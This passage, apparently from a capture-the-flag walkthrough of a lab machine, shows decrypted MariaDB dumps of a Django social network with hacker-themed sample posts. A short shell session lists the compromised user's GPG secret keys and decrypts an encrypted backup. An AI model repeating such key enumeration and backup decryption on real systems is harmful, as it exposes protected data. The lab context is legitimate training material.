  UNIQUE KEY `auth_user_groups_user_id_group_id_94350c0c_uniq` (`user_id`,`group_id`),
  KEY `auth_user_groups_group_id_97559544_fk_auth_group_id` (`group_id`),
  CONSTRAINT `auth_user_groups_group_id_97559544_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`),
  CONSTRAINT `auth_user_groups_user_id_6a12ed8b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_user_permissions` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_user_permissions_user_id_permission_id_14a6b632_uniq` (`user_id`,`permission_id`),
  KEY `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_admin_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `action_time` datetime(6) NOT NULL,
  `object_id` longtext DEFAULT NULL,
  `object_repr` varchar(200) NOT NULL,
  `action_flag` smallint(5) unsigned NOT NULL CHECK (`action_flag` >= 0),
  `change_message` longtext NOT NULL,
  `content_type_id` int(11) DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `django_admin_log_content_type_id_c4bce8eb_fk_django_co` (`content_type_id`),
  KEY `django_admin_log_user_id_c564eba6_fk_auth_user_id` (`user_id`),
  CONSTRAINT `django_admin_log_content_type_id_c4bce8eb_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`),
  CONSTRAINT `django_admin_log_user_id_c564eba6_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=130 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_content_type`
--

DROP TABLE IF EXISTS `django_content_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_content_type` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_label` varchar(100) NOT NULL,
  `model` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `django_content_type_app_label_model_76bd3d3b_uniq` (`app_label`,`model`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_content_type`
--

LOCK TABLES `django_content_type` WRITE;
/*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */;
INSERT INTO `django_content_type` VALUES
(1,'admin','logentry'),
(3,'auth','group'),
(2,'auth','permission'),
(4,'auth','user'),
(5,'contenttypes','contenttype'),
(6,'sessions','session'),
(11,'SocialNetwork','contactrequest'),
(7,'SocialNetwork','socialarticle'),
(10,'SocialNetwork','socialcomment'),
(9,'SocialNetwork','socialmessage'),
(8,'SocialNetwork','socialuser');
/*!40000 ALTER TABLE `django_content_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_migrations`
--

DROP TABLE IF EXISTS `django_migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_migrations` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `app` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `applied` datetime(6) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_migrations`
--

LOCK TABLES `django_migrations` WRITE;
/*!40000 ALTER TABLE `django_migrations` DISABLE KEYS */;
INSERT INTO `django_migrations` VALUES
(1,'SocialNetwork','0001_initial','2024-08-08 18:16:21.370676'),
(2,'SocialNetwork','0002_auto_20240530_2106','2024-08-08 18:16:21.388073'),
(3,'SocialNetwork','0003_alter_socialarticle_date_alter_socialcomment_date','2024-08-08 18:16:21.410144'),
(4,'contenttypes','0001_initial','2024-08-08 18:16:21.505880'),
(5,'auth','0001_initial','2024-08-08 18:16:22.980849'),
(6,'admin','0001_initial','2024-08-08 18:16:23.614631'),
(7,'admin','0002_logentry_remove_auto_add','2024-08-08 18:16:23.653949'),
(8,'admin','0003_logentry_add_action_flag_choices','2024-08-08 18:16:23.692743'),
(9,'contenttypes','0002_remove_content_type_name','2024-08-08 18:16:23.954952'),
(10,'auth','0002_alter_permission_name_max_length','2024-08-08 18:16:24.050357'),
(11,'auth','0003_alter_user_email_max_length','2024-08-08 18:16:24.105707'),
(12,'auth','0004_alter_user_username_opts','2024-08-08 18:16:24.121570'),
(13,'auth','0005_alter_user_last_login_null','2024-08-08 18:16:24.210331'),
(14,'auth','0006_require_contenttypes_0002','2024-08-08 18:16:24.215210'),
(15,'auth','0007_alter_validators_add_error_messages','2024-08-08 18:16:24.231930'),
(16,'auth','0008_alter_user_username_max_length','2024-08-08 18:16:24.288951'),
(17,'auth','0009_alter_user_last_name_max_length','2024-08-08 18:16:24.349177'),
(18,'auth','0010_alter_group_name_max_length','2024-08-08 18:16:24.404983'),
(19,'auth','0011_update_proxy_permissions','2024-08-08 18:16:24.430036'),
(20,'auth','0012_alter_user_first_name_max_length','2024-08-08 18:16:24.639093'),
(21,'sessions','0001_initial','2024-08-08 18:16:24.755268'),
(22,'SocialNetwork','0004_alter_socialarticle_date_alter_socialcomment_date','2024-08-08 21:07:25.546764');
/*!40000 ALTER TABLE `django_migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_session`
--

DROP TABLE IF EXISTS `django_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_session` (
  `session_key` varchar(40) NOT NULL,
  `session_data` longtext NOT NULL,
  `expire_date` datetime(6) NOT NULL,
  PRIMARY KEY (`session_key`),
  KEY `django_session_expire_date_a5c62663` (`expire_date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_session`
--

LOCK TABLES `django_session` WRITE;
/*!40000 ALTER TABLE `django_session` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_session` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-12-29 15:32:32

```

#### Backup 3

```shell
gpg --list-secret-keys
sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup03.sql.gpg
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
-- MariaDB dump 10.19  Distrib 10.11.6-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: hacknet
-- ------------------------------------------------------
-- Server version       10.11.6-MariaDB-0+deb12u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `SocialNetwork_contactrequest`
--

DROP TABLE IF EXISTS `SocialNetwork_contactrequest`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_contactrequest` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `from_user_id` bigint(20) NOT NULL,
  `to_user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_contac_from_user_id_0bebebca_fk_SocialNet` (`from_user_id`),
  KEY `SocialNetwork_contac_to_user_id_9cf0ef37_fk_SocialNet` (`to_user_id`),
  CONSTRAINT `SocialNetwork_contac_from_user_id_0bebebca_fk_SocialNet` FOREIGN KEY (`from_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_contac_to_user_id_9cf0ef37_fk_SocialNet` FOREIGN KEY (`to_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_contactrequest`
--

LOCK TABLES `SocialNetwork_contactrequest` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_contactrequest` DISABLE KEYS */;
/*!40000 ALTER TABLE `SocialNetwork_contactrequest` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialarticle`
--

DROP TABLE IF EXISTS `SocialNetwork_socialarticle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialarticle` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `text` longtext NOT NULL,
  `date` datetime(6) NOT NULL,
  `likes_number` int(11) NOT NULL,
  `comments_number` int(11) NOT NULL,
  `is_like` tinyint(1) NOT NULL,
  `author_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_author_id_eaa37621_fk_SocialNet` (`author_id`),
  CONSTRAINT `SocialNetwork_social_author_id_eaa37621_fk_SocialNet` FOREIGN KEY (`author_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialarticle`
--

LOCK TABLES `SocialNetwork_socialarticle` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialarticle` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialarticle` VALUES
(1,'Just finished an in-depth analysis of a new encryption algorithm. Turns out, it’s more vulnerable than the developers thought. Found a flaw in the key generation process that could lead to predictable keys. Sharing the details in a private forum, but stay tuned for a full write-up on my blog. The importance of secure key management can’t be overstated!','2024-08-08 19:17:22.000000',9,0,0,1),
(2,'Exploring the dark web is like peeling an onion—layers upon layers of hidden services. Discovered a new marketplace that’s operating with military-grade encryption. Impressive setup, but nothing’s invulnerable. I’m working on a proof of concept to bypass their security measures. This will be an interesting challenge.','2024-10-17 12:32:44.000000',8,0,0,1),
(3,'Spent the last few days dissecting a piece of malware disguised as a popular video game mod. The obfuscation techniques were clever, but not clever enough. Managed to reverse-engineer the payload, and it turns out to be a keylogger. Sharing the malware\'s deobfuscated code for educational purposes. Be careful what you download!','2024-11-24 09:08:23.000000',12,0,0,2),
(4,'Just discovered a zero-day in a popular CMS platform. This vulnerability allows remote code execution with minimal effort. Reporting it to the developers now, but this could have serious implications if it gets into the wrong hands. Always vet your plugins and themes—this one slipped through the cracks.','2024-07-15 16:51:59.000000',9,0,0,4),
(5,'Zero-days are rare, but when you find one, it’s like striking gold. Working on a new exploit for a vulnerability I found in a widely used IoT device. This could impact thousands of devices worldwide. Documenting everything carefully—responsible disclosure is key.','2024-11-05 02:31:26.000000',13,2,0,4),
(6,'Cryptography is a double-edged sword. I’ve been working on breaking a new encryption scheme that claims to be uncrackable. Spoiler: it’s not. Found a flaw in the implementation that could allow attackers to decrypt messages without the key. Going to present my findings at the next conference.','2025-01-20 22:12:49.000000',8,1,0,5),
(7,'People are the weakest link in security. I conducted a social engineering experiment to see how easy it was to obtain sensitive information from employees at a local tech firm. Within hours, I had access to their internal network. The human element is always exploitable.','2024-12-03 11:22:28.000000',4,0,0,6),
(8,'Just completed a penetration test on a corporate network. Found several unpatched vulnerabilities that could have been exploited by anyone with basic knowledge. Wrote a detailed report for the client, but I’ll be sharing some of the more interesting findings here soon.','2025-01-23 17:51:14.000000',1,0,0,8),
(9,'Glitches can be more than just bugs—they can be pathways to deeper vulnerabilities. I recently discovered a way to exploit a glitch in a video game to access hidden files on the server. The developers had no idea this was even possible. Documenting the process now.','2024-11-13 13:11:46.000000',6,0,0,9),
(10,'Fault injection attacks are fascinating. I’ve been experimenting with voltage glitching on embedded systems to see what I can break. So far, I’ve managed to bypass authentication on several devices. Writing up a tutorial for anyone interested in this technique.','2025-02-10 20:09:15.000000',9,0,0,9),
(11,'Data breaches are a goldmine for information. I recently got my hands on a dataset from a breached social network and started analyzing the user behavior patterns. The insights are incredible—people are predictable in their online habits. I’ll be sharing some anonymized findings soon.','2024-05-20 14:41:45.000000',12,0,0,10),
(12,'Software protections are getting tougher, but they’re not invincible. I’ve been working on cracking a new DRM system that’s being used in the latest video games. It’s been a challenge, but I’m making progress. Expect a detailed breakdown in the coming weeks.','2024-09-18 04:10:13.000000',1,0,0,12),
(13,'Network security is all about layers. I’ve been testing a multi-layered defense strategy on a corporate network, and so far, it’s holding up well against simulated attacks. Writing up my findings to share with the community—defense in depth is key.','2024-08-01 12:33:47.000000',7,0,0,13),
(14,'Intrusion detection systems are only as good as the rules they’re based on. I’ve been tweaking some custom IDS rules to catch more sophisticated attacks. Managed to detect a few previously unknown attack vectors. Sharing the rule set for anyone interested.','2024-12-23 15:24:08.000000',7,0,0,13),
(15,'Captured some interesting packets from a poorly secured Wi-Fi network. Found a treasure trove of unencrypted data, including login credentials and private messages. It’s a reminder that encryption should be the default for all network communications.','2024-12-08 17:14:54.000000',19,3,0,14),
(16,'Cloaking techniques are evolving. I’ve been working on a new method to hide malicious traffic from intrusion detection systems. Early tests are promising—this could be a game-changer for stealth operations. More to come as I refine the technique.','2024-09-07 09:01:20.000000',10,0,0,16),
(17,'Just finished writing a new Trojan that’s disguised as a legitimate software update. It’s designed to bypass antivirus detection and establish a persistent backdoor. Of course, it’s for research purposes only. Documenting the code and will share it with those interested.','2024-11-12 14:55:51.000000',1,0,0,17),
(18,'Trojan horses are still one of the most effective methods for compromising systems. I’ve been studying some of the latest variants and identifying common traits. Writing up a guide on how to create more effective Trojans—stay tuned.','2024-09-01 10:42:16.000000',1,0,0,17),
(19,'Found an old backdoor in a legacy system that the developers thought they had patched out years ago. Managed to exploit it and gain access to the entire network. It’s a reminder that old vulnerabilities never really go away—they just lie dormant, waiting to be rediscovered.','2024-11-14 18:11:43.000000',0,0,0,18),
(20,'Backdoors are an art form. I’ve been working on a new technique to implant a backdoor in a system without leaving any obvious traces. It’s still in the testing phase, but it’s looking promising. Going to refine it and share the details soon.','2024-12-24 22:31:15.000000',0,0,0,18),
(21,'Crafting exploits is a mix of creativity and technical skill. I’ve been working on a new exploit for a vulnerability in a popular web application. It’s taking longer than expected, but the results will be worth it. Writing up the details as I go.','2024-09-14 12:59:44.000000',12,1,0,19),
(22,'Ethical hacking is about making the digital world a safer place. Just completed a penetration test for a nonprofit organization and identified several critical vulnerabilities. Working with their IT team to get everything patched up—always happy to help make a difference.','2025-01-27 16:18:13.000000',14,2,0,21),
(23,'Exploring the deep web is like diving into the unknown. Recently found a hidden forum that’s full of sensitive data leaks. Started analyzing the information—there’s some valuable intel in there. Going to dig deeper and see what else I can uncover.','2025-01-06 10:45:45.000000',1,0,0,22),
(24,'Just finished developing a new virus that’s designed to spread rapidly across networks. It’s a hybrid of several different strains, combining the best features of each. Of course, it’s for research purposes only—time to see how it performs in the wild.','2024-06-02 14:29:11.000000',8,0,0,23),
(25,'Studying the evolution of viruses is fascinating. I’ve been tracking the development of a new strain that’s been causing havoc recently. It’s incredibly sophisticated, but I’ve identified a few weaknesses. Writing up a report on how to defend against it.','2024-11-02 17:49:34.000000',9,0,0,23),
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
/*!40000 ALTER TABLE `SocialNetwork_socialarticle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialarticle_likes`
--

DROP TABLE IF EXISTS `SocialNetwork_socialarticle_likes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialarticle_likes` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `socialarticle_id` bigint(20) NOT NULL,
  `socialuser_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `SocialNetwork_socialarti_socialarticle_id_socialu_44364a80_uniq` (`socialarticle_id`,`socialuser_id`),
  KEY `SocialNetwork_social_socialuser_id_f84a535a_fk_SocialNet` (`socialuser_id`),
  CONSTRAINT `SocialNetwork_social_socialarticle_id_0ac522cf_fk_SocialNet` FOREIGN KEY (`socialarticle_id`) REFERENCES `SocialNetwork_socialarticle` (`id`),
  CONSTRAINT `SocialNetwork_social_socialuser_id_f84a535a_fk_SocialNet` FOREIGN KEY (`socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=190 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialarticle_likes`
--

LOCK TABLES `SocialNetwork_socialarticle_likes` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialarticle_likes` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialarticle_likes` VALUES
(164,1,4),
(142,1,7),
(121,1,10),
(107,1,12),
(97,1,13),
(83,1,15),
(67,1,17),
(57,1,19),
(19,1,24),
(182,2,2),
(171,2,3),
(163,2,4),
(141,2,7),
(88,2,14),
(50,2,20),
(42,2,21),
(28,2,23),
(184,3,1),
(178,3,2),
(161,3,4),
(147,3,6),
(132,3,8),
(117,3,10),
(87,3,14),
(72,3,16),
(48,3,20),
(39,3,21),
(25,3,23),
(15,3,24),
(173,4,3),
(151,4,6),
(115,4,11),
(108,4,12),
(77,4,16),
(68,4,17),
(31,4,23),
(20,4,24),
(9,4,25),
(185,5,1),
(180,5,2),
(170,5,3),
(140,5,7),
(133,5,8),
(118,5,10),
(112,5,11),
(81,5,15),
(73,5,16),
(64,5,17),
(54,5,19),
(16,5,24),
(5,5,25),
(176,6,2),
(154,6,5),
(145,6,6),
(124,6,9),
(103,6,12),
(85,6,14),
(46,6,20),
(2,6,25),
(155,7,5),
(94,7,13),
(61,7,17),
(4,7,25),
(130,8,8),
(162,9,4),
(104,9,12),
(62,9,17),
(49,9,20),
(40,9,21),
(26,9,23),
(175,10,2),
(144,10,6),
(137,10,7),
(122,10,9),
(100,10,12),
(70,10,16),
(36,10,21),
(11,10,24),
(1,10,25),
(188,11,1),
(166,11,4),
(158,11,5),
(152,11,6),
(143,11,7),
(128,11,9),
(109,11,12),
(84,11,15),
(78,11,16),
(69,11,17),
(45,11,21),
(10,11,25),
(105,12,12),
(157,13,5),
(135,13,8),
(127,13,9),
(98,13,13),
(90,13,14),
(44,13,21),
(8,13,25),
(177,14,2),
(169,14,3),
(92,14,13),
(71,14,16),
(47,14,20),
(23,14,23),
(13,14,24),
(179,15,2),
(168,15,3),
(160,15,4),
(146,15,6),
(138,15,7),
(131,15,8),
(123,15,9),
(111,15,11),
(102,15,12),
(93,15,13),
(86,15,14),
(80,15,15),
(60,15,17),
(53,15,19),
(38,15,21),
(33,15,22),
(24,15,23),
(14,15,24),
(3,15,25),
(181,16,2),
(172,16,3),
(156,16,5),
(134,16,8),
(119,16,10),
(82,16,15),
(75,16,16),
(51,16,20),
(35,16,22),
(7,16,25),
(63,17,17),
(66,18,17),
(187,21,1),
(149,21,6),
(126,21,9),
(113,21,11),
(106,21,12),
(96,21,13),
(74,21,16),
(65,21,17),
(56,21,19),
(29,21,23),
(18,21,24),
(6,21,25),
(183,22,1),
(167,22,3),
(159,22,4),
(153,22,5),
(129,22,8),
(116,22,10),
(110,22,11),
(91,22,13),
(79,22,15),
(59,22,17),
(52,22,19),
(37,22,21),
(22,22,23),
(12,22,24),
(189,23,18),
(174,24,3),
(165,24,4),
(136,24,8),
(120,24,10),
(99,24,13),
(58,24,19),
(32,24,23),
(21,24,24),
(186,25,1),
(148,25,6),
(125,25,9),
(95,25,13),
(55,25,19),
(41,25,21),
(34,25,22),
(27,25,23),
(17,25,24),
(150,26,6),
(114,26,11),
(89,26,14),
(76,26,16),
(43,26,21),
(30,26,23);
/*!40000 ALTER TABLE `SocialNetwork_socialarticle_likes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialcomment`
--

DROP TABLE IF EXISTS `SocialNetwork_socialcomment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialcomment` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `text` longtext NOT NULL,
  `date` datetime(6) NOT NULL,
  `article_id` bigint(20) NOT NULL,
  `author_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_article_id_09c62d03_fk_SocialNet` (`article_id`),
  KEY `SocialNetwork_social_author_id_4235a6b2_fk_SocialNet` (`author_id`),
  CONSTRAINT `SocialNetwork_social_article_id_09c62d03_fk_SocialNet` FOREIGN KEY (`article_id`) REFERENCES `SocialNetwork_socialarticle` (`id`),
  CONSTRAINT `SocialNetwork_social_author_id_4235a6b2_fk_SocialNet` FOREIGN KEY (`author_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialcomment`
--

LOCK TABLES `SocialNetwork_socialcomment` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialcomment` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialcomment` VALUES
(1,'Great work, whitehat! It\'s awesome to see ethical hacking being used for good, especially for organizations that might not have the resources to maintain top-tier security. Those vulnerabilities could have been devastating if left unchecked. Keep up the great work—you\'re making the internet a safer place for everyone!','2025-01-28 20:45:22.000000',22,5),
(2,'Love seeing hackers use their skills for positive change! Nonprofits often overlook cybersecurity due to budget constraints, so your work here is invaluable. I’d be interested to know what kind of vulnerabilities you found—anything that stood out as particularly surprising?','2025-01-30 12:32:53.000000',22,3),
(3,'Yikes! It\'s scary how many people still use unsecured networks without thinking twice. Capturing unencrypted data is like finding an open vault. This is a good reminder for everyone to always use a VPN when connecting to public Wi-Fi. Encryption should be non-negotiable in today’s world.','2024-12-16 16:29:12.000000',15,19),
(4,'That’s a goldmine of data, but also a stark reminder of how vulnerable people are when they don’t take basic precautions. It’s amazing how many networks are still left wide open. Hopefully, posts like this will encourage more users to secure their communications.','2024-12-31 12:13:56.000000',15,23),
(5,'Unencrypted data on a public network is a hacker’s dream and a user’s nightmare. It\'s shocking how many people still don\'t realize the risks of using insecure Wi-Fi. This should be a wake-up call for anyone who thinks they’re safe without encryption.','2025-01-06 22:31:25.000000',15,8),
(6,'That’s a huge find! It’s incredible how often \'uncrackable\' encryption schemes turn out to have vulnerabilities in their implementation. Can’t wait to hear more about this at the conference—this could have major implications for anyone relying on that scheme for security.','2025-01-21 23:12:45.000000',6,9),
(7,'Finding a zero-day is like hitting the jackpot! It’s great to hear you’re taking the responsible disclosure route—those IoT devices are in so many homes, and an exploit like this could cause massive damage if it fell into the wrong hands. Looking forward to reading your documentation.','2024-11-28 04:58:23.000000',5,14),
(8,'Zero-days in IoT devices are especially concerning given how widespread they are. Your work could be crucial in preventing a potential disaster. Kudos for emphasizing responsible disclosure—can’t wait to see how this unfolds.','2024-12-23 18:34:55.000000',5,2),
(9,'Exploits that take time usually turn out to be the most sophisticated and effective. The mix of creativity and technical skill is what sets great work apart—looking forward to seeing the final result. Your write-up will definitely be a valuable read!','2024-10-27 16:12:58.000000',21,13),
(10,'Brute force may be old-school, but it’s hard to argue with results. Efficiency improvements could make this technique even more formidable—can’t wait to see your guide on optimizing it. It\'s always fascinating to see how these methods evolve.','2024-08-31 15:59:35.000000',26,20),
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
/*!40000 ALTER TABLE `SocialNetwork_socialcomment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialmessage`
--

DROP TABLE IF EXISTS `SocialNetwork_socialmessage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialmessage` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `date` datetime(6) NOT NULL,
  `text` longtext NOT NULL,
  `is_read` tinyint(1) NOT NULL,
  `from_user_id` bigint(20) NOT NULL,
  `to_user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_from_user_id_c7b711b1_fk_SocialNet` (`from_user_id`),
  KEY `SocialNetwork_social_to_user_id_5dc6657d_fk_SocialNet` (`to_user_id`),
  CONSTRAINT `SocialNetwork_social_from_user_id_c7b711b1_fk_SocialNet` FOREIGN KEY (`from_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_social_to_user_id_5dc6657d_fk_SocialNet` FOREIGN KEY (`to_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=63 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialmessage`
--

LOCK TABLES `SocialNetwork_socialmessage` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialmessage` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialmessage` VALUES
(1,'2024-12-27 17:19:17.907990','Hey! Have you seen the latest episode of Space Chronicles?',1,11,1),
(2,'2024-12-27 17:19:34.532931','No spoilers! I’m planning to watch it tonight. Is it good?',1,1,11),
(3,'2024-12-27 17:19:51.380822','Oh, it’s amazing! Lots of twists. You’re going to love it.',1,11,1),
(4,'2024-12-27 17:20:09.524879','Can’t wait. Should I prepare for any emotional rollercoasters?',1,1,11),
(5,'2024-12-27 17:20:24.703076','Definitely. Keep tissues nearby.',0,11,1),
(6,'2024-12-27 17:21:03.637268','Hey, are you free this weekend?',1,15,5),
